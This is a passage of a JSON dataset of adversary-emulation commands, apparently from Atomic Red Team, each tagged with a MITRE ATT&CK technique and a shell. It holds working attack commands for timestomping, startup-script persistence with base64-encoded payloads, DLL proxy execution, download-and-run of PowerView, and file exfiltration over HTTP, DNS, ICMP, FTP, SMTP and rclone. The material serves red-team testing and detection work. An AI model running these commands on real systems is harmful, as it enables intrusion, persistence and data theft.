        "MitreAttackClassification": "T1649",
        "Shell": "powershell"
    },
    {
        "ID": 392,
        "Command": "touch -a -t 197001010000.00 /tmp/T1070.006-access.txt\n",
        "Description": "Stomps on the access timestamp of a file\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.006",
        "Shell": "sh"
    },
    {
        "ID": 393,
        "Command": "touch -m -t 197001010000.00 /tmp/T1070.006-modification.txt\n",
        "Description": "Stomps on the modification timestamp of a file\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.006",
        "Shell": "sh"
    },
    {
        "ID": 394,
        "Command": "NOW=$(date +%m%d%H%M%Y)\ndate 010100001971\ntouch /tmp/T1070.006-creation.txt\ndate \"$NOW\"\nstat /tmp/T1070.006-creation.txt\n",
        "Description": "Stomps on the create timestamp of a file\n\nSetting the creation timestamp requires changing the system clock and reverting.\nSudo or root privileges are required to change date. Use with caution.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.006",
        "Shell": "sh"
    },
    {
        "ID": 395,
        "Command": "touch /tmp/T1070.006-reference.txt\ntouch -acmr /bin/sh /tmp/T1070.006-reference.txt\n",
        "Description": "Modifies the `modify` and `access` timestamps using the timestamps of a specified reference file.\n\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.006",
        "Shell": "sh"
    },
    {
        "ID": 396,
        "Command": "Get-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" | % { $_.CreationTime = \"01/01/1970 00:00:00\" }\n",
        "Description": "Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.006",
        "Shell": "powershell"
    },
    {
        "ID": 397,
        "Command": "Get-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" | % { $_.LastWriteTime = \"01/01/1970 00:00:00\" }\n",
        "Description": "Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.006",
        "Shell": "powershell"
    },
    {
        "ID": 398,
        "Command": "Get-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" | % { $_.LastAccessTime = \"01/01/1970 00:00:00\" }\n",
        "Description": "Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.006",
        "Shell": "powershell"
    },
    {
        "ID": 399,
        "Command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1\"\ntimestomp -dest \"PathToAtomicsFolder\\..\\ExternalPayloads\\kxwn.lock\"\n",
        "Description": "Timestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in PathToAtomicsFolder\\..\\ExternalPayloads and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.006",
        "Shell": "powershell"
    },
    {
        "ID": 400,
        "Command": "SetFile -m 01/01/1970 /tmp/T1070.006-modified.txt\n",
        "Description": "Stomps on the modification timestamp of a file using MacOS's SetFile utility\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.006",
        "Shell": "sh"
    },
    {
        "ID": 401,
        "Command": "try{ \n  Set-Date -Date (Get-Date).AddDays(3)\n  Add-Content \"$env:APPDATA\\slipDays.bak\" 3\n}\ncatch {exit 1}\n",
        "Description": "Changes the system time on the computer to a time that you specify. It involves altering the system’s clock or adjusting the dates of files, affecting timestamp integrity within Event Logs. This technique can disrupt the sequence of logged events, complicating incident analysis and forensics. \nReference - \nhttps://detect.fyi/event-log-manipulations-1-time-slipping-55bf95631c40\nhttps://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-date?view=powershell-7.4",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.006",
        "Shell": "powershell"
    },
    {
        "ID": 402,
        "Command": "netsh.exe add helper \"PathToAtomicsFolder\\T1546.007\\bin\\NetshHelper.dll\"\ntaskkill /im notepad.exe /t /f > NUL 2>&1\n",
        "Description": "You can register a \"helper dll\" with Netsh as a persistance mechanism. The code in the dll is executed every time netsh.exe is called.\nThe NetshHelper.dll provided with the atomic will simply launch notepad when netsh.exe is run.\n\n[Blog](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)\n[Sample DLL code](https://github.com/outflanknl/NetshHelperBeacon)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.007",
        "Shell": "command_prompt"
    },
    {
        "ID": 403,
        "Command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"%tmp%\\T1218.009.dll\" /target:library \"PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs\"\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U %tmp%\\T1218.009.dll\n",
        "Description": "Executes the Uninstall Method, No Admin Rights Required. Upon execution, \"I shouldn't really execute either.\" will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.009",
        "Shell": "command_prompt"
    },
    {
        "ID": 404,
        "Command": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='\n$Content = [System.Convert]::FromBase64String($key)\nSet-Content $env:Temp\\key.snk -Value $Content -Encoding Byte\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"$Env:TEMP\\T1218.009.dll\" /target:library /keyfile:$env:Temp\\key.snk PathToAtomicsFolder\\T1218.009\\src\\T1218.009.cs\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe $Env:TEMP\\T1218.009.dll\n",
        "Description": "Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, \"I shouldn't really execute\" will be displayed\nalong with other information about the assembly being installed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.009",
        "Shell": "powershell"
    },
    {
        "ID": 405,
        "Command": "Start-Process -FilePath \"C:\\Program Files (x86)\\AutoIt3\\AutoIt3.exe\" -ArgumentList \"PathToAtomicsFolder\\T1059\\src\\calc.au3\"\n",
        "Description": "An adversary may attempt to execute suspicious or malicious script using AutoIt software instead of regular terminal like powershell or cmd. Calculator will popup when the script is executed successfully.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1059",
        "Shell": "powershell"
    },
    {
        "ID": 406,
        "Command": "if(-not (Test-Path $env:TEMP\\LineNumbers.txt)){ \n  1..100 | ForEach-Object { Add-Content -Path $env:TEMP\\LineNumbers.txt -Value \"This is line $_.\" }\n}\n[System.Net.ServicePointManager]::Expect100Continue = $false\n$filecontent = Get-Content -Path $env:TEMP\\LineNumbers.txt\nInvoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive\n",
        "Description": "Exfiltrates a file present on the victim machine to the C2 server.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1041",
        "Shell": "powershell"
    },
    {
        "ID": 407,
        "Command": "$dnsServer = \"dns.example.com\"\n$exfiltratedData = \"SecretDataToExfiltrate\"\n$chunkSize = 63\n\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\n$encodedData = [Convert]::ToBase64String($encodedData)\n$chunks = $encodedData -split \"(.{$chunkSize})\"\n\nforeach ($chunk in $chunks) {\n\\t$dnsQuery = $chunk + \".\" + $dnsServer\n\\tResolve-DnsName -Name $dnsQuery\n\\tStart-Sleep -Seconds 5\n}\n",
        "Description": "Simulates an adversary using DNS tunneling to exfiltrate data over a Command and Control (C2) channel.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1041",
        "Shell": "powershell"
    },
    {
        "ID": 408,
        "Command": "sudo echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common\n",
        "Description": "Modify rc.common\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1037.004",
        "Shell": "bash"
    },
    {
        "ID": 409,
        "Command": "filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi\nprintf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common\nprintf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common\nsudo chmod +x /etc/rc.common\n",
        "Description": "Modify rc.common\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1037.004",
        "Shell": "bash"
    },
    {
        "ID": 410,
        "Command": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi\n[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local\necho \"\\npython3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local\nprintf 'exit 0' | sudo tee -a /etc/rc.local\nsudo chmod +x /etc/rc.local\n",
        "Description": "Modify rc.local\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1037.004",
        "Shell": "sh"
    },
    {
        "ID": 411,
        "Command": "cp PathToAtomicsFolder/T1027.002/bin/linux/test_upx /tmp/packed_bin && /tmp/packed_bin\n",
        "Description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027.002",
        "Shell": "sh"
    },
    {
        "ID": 412,
        "Command": "cp PathToAtomicsFolder/T1027.002/bin/linux/test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin\n",
        "Description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027.002",
        "Shell": "sh"
    },
    {
        "ID": 413,
        "Command": "cp PathToAtomicsFolder/T1027.002/bin/darwin/test_upx /tmp/packed_bin && /tmp/packed_bin\n",
        "Description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027.002",
        "Shell": "sh"
    },
    {
        "ID": 414,
        "Command": "cp PathToAtomicsFolder/T1027.002/bin/darwin/test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin\n",
        "Description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1027.002",
        "Shell": "sh"
    },
    {
        "ID": 415,
        "Command": "tcpdump -c 5 -nnni ens33\ntshark -c 5 -i ens33\n",
        "Description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "bash"
    },
    {
        "ID": 416,
        "Command": "tcpdump -c 5 -nnni em0\ntshark -c 5 -i em0\n",
        "Description": "Perform a PCAP. Wireshark will be required for tshark. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface ens33.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "sh"
    },
    {
        "ID": 417,
        "Command": "sudo tcpdump -c 5 -nnni en0A\\t\nif [ -x \"$(command -v tshark)\" ]; then sudo tshark -c 5 -i en0A; fi;\n",
        "Description": "Perform a PCAP on macOS. This will require Wireshark/tshark to be installed. TCPdump may already be installed.\n\nUpon successful execution, tshark or tcpdump will execute and capture 5 packets on interface en0A.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "bash"
    },
    {
        "ID": 418,
        "Command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet -c 5\n",
        "Description": "Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark\ninstalled.\n\nUpon successful execution, tshark will execute and capture 5 packets on interface \"Ethernet\".\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "command_prompt"
    },
    {
        "ID": 419,
        "Command": "netsh trace start capture=yes tracefile=%temp%\\trace.etl maxsize=10",
        "Description": "Uses the built-in Windows packet capture\nAfter execution you should find a file named trace.etl and trace.cab in the temp directory",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "command_prompt"
    },
    {
        "ID": 420,
        "Command": "pktmon.exe start --etw  -f %TEMP%\\t1040.etl\nTIMEOUT /T 5 >nul 2>&1\npktmon.exe stop\n",
        "Description": "Will start a packet capture and store log file as t1040.etl.\nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "command_prompt"
    },
    {
        "ID": 421,
        "Command": "pktmon.exe filter add -p 445\n",
        "Description": "Select Desired ports for packet capture \nhttps://lolbas-project.github.io/lolbas/Binaries/Pktmon/",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "command_prompt"
    },
    {
        "ID": 422,
        "Command": "sudo /tmp/t1040_macos_pcapdemo -i en0 -t 3\n",
        "Description": "Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "bash"
    },
    {
        "ID": 423,
        "Command": "sudo /tmp/t1040_macos_pcapdemo -f -i en0 -t 3\n",
        "Description": "Opens a /dev/bpf file (O_RDONLY), sets BPF filter for 'udp' and captures packets for a few seconds.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "bash"
    },
    {
        "ID": 424,
        "Command": "sudo /tmp/t1040_freebsd_pcapdemo -i em0 -t 3\n",
        "Description": "Opens a /dev/bpf file (O_RDONLY) and captures packets for a few seconds.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "sh"
    },
    {
        "ID": 425,
        "Command": "sudo /tmp/t1040_freebsd_pcapdemo -f -i em0 -t 3\n",
        "Description": "Opens a /dev/bpf file (O_RDONLY), sets BPF filter for 'udp' and captures packets for a few seconds.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "sh"
    },
    {
        "ID": 426,
        "Command": "sudo /tmp/t1040_linux_pcapdemo -a -t 3\n",
        "Description": "Captures packets with domain=AF_PACKET, type=SOCK_RAW for a few seconds.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "bash"
    },
    {
        "ID": 427,
        "Command": "sudo /tmp/t1040_linux_pcapdemo -4 -p 6 -t 3\n",
        "Description": "Captures packets with domain=AF_INET,type=SOCK_RAW,protocol=TCP for a few seconds.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "bash"
    },
    {
        "ID": 428,
        "Command": "sudo /tmp/t1040_linux_pcapdemo -4 -P -p 17 -t 3\n",
        "Description": "Captures packets with domain=AF_INET,type=SOCK_PACKET,protocol=UDP for a few seconds.\nSOCK_PACKET is \"obsolete\" according to the man page, but still works on Ubuntu 20.04\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "bash"
    },
    {
        "ID": 429,
        "Command": "sudo /tmp/t1040_linux_pcapdemo -a -f -t 3\n",
        "Description": "Captures packets with domain=AF_PACKET,type=SOCK_RAW for a few seconds.\nSets a BPF filter on the socket to filter for UDP traffic.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "bash"
    },
    {
        "ID": 430,
        "Command": "New-NetEventSession -Name Capture007 -LocalFilePath \"$ENV:Temp\\sniff.etl\"\nAdd-NetEventPacketCaptureProvider -SessionName Capture007 -TruncationLength 100\nStart-NetEventSession -Name Capture007\nStop-NetEventSession -Name Capture007\nRemove-NetEventSession -Name Capture007\n",
        "Description": "PowerShell Built-in Cmdlets to capture network traffic.\nhttps://learn.microsoft.com/en-us/powershell/module/neteventpacketcapture/new-neteventsession?view=windowsserver2022-ps",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1040",
        "Shell": "powershell"
    },
    {
        "ID": 431,
        "Command": "1. Victim System Configuration:\n\n\\tmkdir /tmp/victim-staging-area\n\\techo \"this file will be exfiltrated\" > /tmp/victim-staging-area/victim-file.txt\n\n2. Using Python to establish a one-line HTTP server on victim system:\n\n\\tcd /tmp/victim-staging-area\n\\tpython -m SimpleHTTPServer 1337\n\n3. To retrieve the data from an adversary system:\n\n\\twget http://VICTIM_IP:1337/victim-file.txt\n",
        "Description": "A firewall rule (ipfw,pf,iptables or firewalld) will be needed to allow exfiltration on port 1337.\n\nUpon successful execution, sh will be used to make a directory (/tmp/victim-staging-area), write a txt file, and host the directory with Python on port 1337, to be later downloaded.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048.003",
        "Shell": "manual"
    },
    {
        "ID": 432,
        "Command": "$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path C:\\Windows\\System32\\notepad.exe -Encoding Byte -ReadCount 1024) { $ping.Send(\"127.0.0.1\", 1500, $Data) }\n",
        "Description": "Exfiltration of specified file over ICMP protocol.\n\nUpon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048.003",
        "Shell": "powershell"
    },
    {
        "ID": 433,
        "Command": "1. On the adversary machine run the below command.\n\n\\ttshark -f \"udp port 53\" -Y \"dns.qry.type == 1 and dns.flags.response == 0 and dns.qry.name matches \\\\\".domain\\\\\"\" >> received_data.txt\n\n2. On the victim machine run the below commands.\n\n\\txxd -p input_file > encoded_data.hex | for data in `cat encoded_data.hex`; do dig $data.domain; done\n\n3. Once the data is received, use the below command to recover the data.\n\n\\tcat output_file | cut -d \"A\" -f 2 | cut -d \" \" -f 2 | cut -d \".\" -f 1 | sort | uniq | xxd -p -r\n",
        "Description": "Exfiltration of specified file over DNS protocol.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048.003",
        "Shell": "manual"
    },
    {
        "ID": 434,
        "Command": "$content = Get-Content C:\\Windows\\System32\\notepad.exe\nInvoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content\n",
        "Description": "Exfiltration of specified file over HTTP.\nUpon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048.003",
        "Shell": "powershell"
    },
    {
        "ID": 435,
        "Command": "Send-MailMessage -From test@corp.com -To test@corp.com -Subject \"T1048.003 Atomic Test\" -Attachments C:\\Windows\\System32\\notepad.exe -SmtpServer 127.0.0.1\n",
        "Description": "Exfiltration of specified file over SMTP.\nUpon successful execution, powershell will send an email with attached file to exfiltrate to a remote address. Results will be via stdout.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048.003",
        "Shell": "powershell"
    },
    {
        "ID": 436,
        "Command": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://127.0.0.1/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('', '')\nif (test-connection -count 1 -computername \"127.0.0.1\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}\n",
        "Description": "This test simulates MAZE's ransomware's ability to exfiltrate data via FTP.\nUpon successful execution, all 7z files within the %windir%\\temp directory will be uploaded to a remote FTP server. \nReference: https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048.003",
        "Shell": "powershell"
    },
    {
        "ID": 437,
        "Command": "$rclone_bin = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"rclone.exe\" | Select-Object -ExpandProperty FullName\n$exfil_pack = Get-ChildItem C:\\Users\\Public\\Downloads\\ -Recurse -Include \"exfil.zip\" | Select-Object -ExpandProperty FullName\n&$rclone_bin config create ftpserver \"ftp\" \"host\" ftp.dlptest.com \"port\" 21 \"user\" dlpuser \"pass\" rNrKYTX9g7z3RgJRmxWuGHbeu\n&$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate",
        "Description": "Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.\n[Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/)",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048.003",
        "Shell": "powershell"
    },
    {
        "ID": 438,
        "Command": "[ \"$(uname)\" = 'FreeBSD' ] && alias python3=python3.9\nif [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi\n",
        "Description": "An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1048.003",
        "Shell": "sh"
    },
    {
        "ID": 439,
        "Command": "dir $env:USERPROFILE -Recurse | Compress-Archive -DestinationPath $env:USERPROFILE\\T1560-data-ps.zip\n",
        "Description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.\nWhen the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1560",
        "Shell": "powershell"
    },
    {
        "ID": 440,
        "Command": "$buffer = New-Object byte[] 11\n$handle = New-Object IO.FileStream \"\\\\.\\C:\", 'Open', 'Read', 'ReadWrite'\n$handle.Read($buffer, 0, $buffer.Length)\n$handle.Close()\nFormat-Hex -InputObject $buffer\n",
        "Description": "This test uses PowerShell to open a handle on the drive volume via the `\\\\.\\` [DOS device path specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) and perform direct access read of the first few bytes of the volume.\nOn success, a hex dump of the first 11 bytes of the volume is displayed.\n\nFor a NTFS volume, it should correspond to the following sequence ([NTFS partition boot sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n```\n           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n\n00000000   EB 52 90 4E 54 46 53 20 20 20 20                 ëR?NTFS\n```",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1006",
        "Shell": "powershell"
    },
    {
        "ID": 441,
        "Command": "cat /etc/pam.d/common-password\n",
        "Description": "Lists the password complexity policy to console on Ubuntu Linux.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1201",
        "Shell": "bash"
    },
    {
        "ID": 442,
        "Command": "cat /etc/pam.d/passwd\n",
        "Description": "Lists the password complexity policy to console on FreeBSD.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1201",
        "Shell": "sh"
    },
    {
        "ID": 443,
        "Command": "cat /etc/security/pwquality.conf\n",
        "Description": "Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1201",
        "Shell": "bash"
    },
    {
        "ID": 444,
        "Command": "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n",
        "Description": "Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1201",
        "Shell": "bash"
    },
    {
        "ID": 445,
        "Command": "cat /etc/login.defs\n",
        "Description": "Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1201",
        "Shell": "bash"
    },
    {
        "ID": 446,
        "Command": "net accounts\n",
        "Description": "Lists the local password policy to console on Windows.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1201",
        "Shell": "command_prompt"
    },
    {
        "ID": 447,
        "Command": "net accounts /domain\n",
        "Description": "Lists the domain password policy to console on Windows.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1201",
        "Shell": "command_prompt"
    },
    {
        "ID": 448,
        "Command": "pwpolicy getaccountpolicies",
        "Description": "Lists the password policy to console on macOS.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1201",
        "Shell": "bash"
    },
    {
        "ID": 449,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose\n",
        "Description": "Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1201",
        "Shell": "powershell"
    },
    {
        "ID": 450,
        "Command": "get-addefaultdomainpasswordpolicy\n",
        "Description": "The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.\nUpon successful execution a listing of the policy implemented will display.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1201",
        "Shell": "powershell"
    },
    {
        "ID": 451,
        "Command": "secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt\n",
        "Description": "SecEdit.exe can be used to export the current local security policy applied to a host.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
        "Score": null,
